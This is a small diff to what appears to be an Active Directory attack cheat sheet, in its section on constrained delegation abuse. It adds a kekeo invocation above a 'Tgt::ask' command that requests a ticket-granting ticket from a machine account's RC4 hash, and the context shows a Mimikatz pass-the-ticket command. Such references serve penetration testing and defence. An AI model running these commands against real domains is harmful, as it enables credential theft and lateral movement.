@@ -930,6 +930,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ### Constrained delegation Computer
 #### Requesting TGT with a PC hash
 ```
+./kekeo.exe
 Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
 ```
 
